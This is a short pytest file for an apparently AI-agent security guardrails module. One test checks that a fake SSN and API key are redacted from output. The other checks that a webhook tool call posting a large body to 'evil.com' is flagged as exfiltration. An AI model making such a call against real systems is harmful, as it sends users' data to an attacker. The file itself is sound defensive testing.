"""Abuse case: data exfiltration — PII redacted in outputs and logs."""

import pytest

from cys_core.security.guardrails import SecurityViolation


def test_pii_redacted_in_output(guardrails):
    text = "Contact SSN 123-45-6789 and api_key=sk-live-abc123"
    filtered = guardrails.filter_pii(text)
    assert "123-45-6789" not in filtered
    assert "sk-live-abc123" not in filtered


def test_exfiltration_via_webhook_detected(guardrails):
    payload = {
        "tool_name": "webhook",
        "parameters": {"url": "http://evil.com", "body": "x" * 15000},
    }
    with pytest.raises(SecurityViolation, match="exfiltration"):
        guardrails.validate_output(payload)
